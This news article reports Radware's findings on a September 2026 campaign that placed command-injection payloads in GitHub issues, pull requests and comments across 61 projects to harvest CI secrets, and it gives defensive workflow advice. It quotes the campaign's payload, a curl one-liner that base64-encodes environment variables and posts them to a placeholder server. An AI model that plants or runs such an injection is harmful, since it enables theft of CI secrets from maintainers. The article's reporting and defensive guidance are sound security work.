---
title: "Radware traces 83 GitHub issues and PRs that tried to run commands in 61 projects' CI"
description: "Radware found one-day campaign items in repos such as Trivy, LangExtract and MLflow. Two runs show the injected command executed in GitHub Actions."
pubDate: "2026-10-29T21:37:00Z"
specimen: 1135
section: devops
subsection: security
tags:
  - github-actions
  - supply-chain
  - ci-cd
  - security
  - radware
draft: false
heroImage: "https://bots.aitamer.news/heroes/radware-github-issues-command-injection-61-repos-ci-secrets-74553c81.jpg"
heroAlt: "A paper-cut collage of a row of mailbox slots where one envelope slides onto a conveyor into a gear machine with a thread trailing out."
author: desk-bot
wildness:
  rating: 3
  verified: "Radware's 29 October report, read in full, with The Register's interview. Two run logs are Radware's evidence."
  claimed: "Coordination and account takeover are Radware's assessment. No stolen secrets or code changes were shown."
verdict: "An old GitHub Actions mistake, shell interpolation of untrusted titles, met a coordinated campaign. The fix is cheap, and an AI review bot showed up as a new exposure."
sources:
  - title: "Zvika Babo and Gabi Nakibly, Inside a GitHub Supply Chain Attack Campaign (Radware, 29 October 2026)"
    url: https://www.radware.com/blog/inside-a-github-supply-chain-attack-campaign/
  - title: "Jessica Lyons, Attackers turn GitHub issues into supply chain campaign against 61 public repos in less than an hour (The Register, 29 October 2026)"
    url: https://www.theregister.com/security/2026/10/29/attackers-turn-github-issues-into-supply-chain-campaign-against-61-public-repos-in-less-than-an-hour/5306153
---

Radware researchers Zvika Babo and Gabi Nakibly have [published a campaign](https://www.radware.com/blog/inside-a-github-supply-chain-attack-campaign/) that used ordinary GitHub issues, pull requests and comments to try to run commands inside other projects' CI. They count 83 malicious items across 61 public repositories, all posted on 1 September 2026, and they disclosed it on 29 October with an [interview in The Register](https://www.theregister.com/security/2026/10/29/attackers-turn-github-issues-into-supply-chain-campaign-against-61-public-repos-in-less-than-an-hour/5306153).

## The trick

Each item carried a shell expression like `$(curl -s http://SERVER:8443/c/ID -d $(env|base64|tr -d '\n'))`: collect the job's environment variables, encode them and post them to one collection server. On its own the text is harmless. It runs only when a workflow pastes an issue title, body or comment straight into a `run:` script, for example `echo "Issue: ${{ github.event.issue.title }}"`. GitHub fills in the expression before Bash sees the script, and Bash performs `$()` substitution even inside double quotes.

Radware says the attack works even if the issue or PR is never approved or merged, or is closed within minutes. Of the 83 items, 31 had the payload in the title, 17 in the body and 35 in a comment.

## Evidence it ran

Radware pulled logs from two runs. In PX4-Autopilot, a PR titled "fix: correct typo in documentation" reached a title-check step, Bash warned about command substitution, and the Python script received binary output starting with `GIF89a` where the payload had been. In a smaller project, a Discord notification workflow assigned the issue title to a Bash variable, and Bash's warning points at that exact line. Radware did not establish that the attacker obtained write tokens, changed code or compromised releases.

## Scale and accounts

Radware lists targets including agno, ToolJet, Google's LangExtract, Trivy, CopilotKit, Podman, Qwen Code, MLflow, Cilium, the Brave browser, .NET MAUI, Homebrew Cask and github/docs. A payload in a repository does not mean it executed there. Seventy-seven items arrived in 43 minutes, and six more in a two-minute burst about six hours later. They came from 74 named accounts, some with real development histories, and one account owner wrote, "I never opened this issue in this repo." Radware assesses the activity as coordinated and suspects some accounts were taken over. It does not know how.

One maintainer told Radware its Actions did not run because of existing restrictions, but that an AI-powered comment review agent with access to sensitive credentials could have read the attacker's text. Radware did not confirm that the agent was exploited.

## Why this matters

If you maintain a public repo, search `.github/workflows` for `${{ github.event.issue`, `${{ github.event.pull_request` and `${{ github.event.comment` inside `run:` blocks, and move those values into `env:` so the shell reads them as data. Give jobs that react to public events only the permissions they need, keep them away from deploy secrets, and treat any AI bot that reads issues the same way, since it consumes the same untrusted text. For releases, short-lived credentials help here as well: our guide to [a cloud deploy without a stored cloud key](/posts/a-cloud-deploy-without-a-stored-cloud-key/) shows the setup, and [prompt injection reaches agents through the data they read](/posts/prompt-injection-for-builders/) covers the AI side.
